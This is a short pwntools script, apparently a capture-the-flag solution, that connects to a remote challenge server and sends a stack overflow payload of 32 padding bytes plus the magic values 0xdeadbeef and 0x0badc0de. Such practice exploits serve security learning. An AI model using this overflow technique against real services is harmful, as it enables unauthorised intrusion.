from pwn import *

pr = remote('p0wn3d2.kctf-453514-codelab.kctf.cloud', 1337)
#pr = process('./chal')

padiing = 32

"""gdb.attach(pr, '''
        b*0x0000000000401219
        c
''')
"""
payload  = flat (
    
    b'A' * padiing,
    p32(0xdeadbeef),
    p32(0x0badc0de),
   
    
)


info(f"Payload: {payload}")
pr.recvuntil(b"yourself?\n")
pr.sendline(payload)

print(pr.recvall())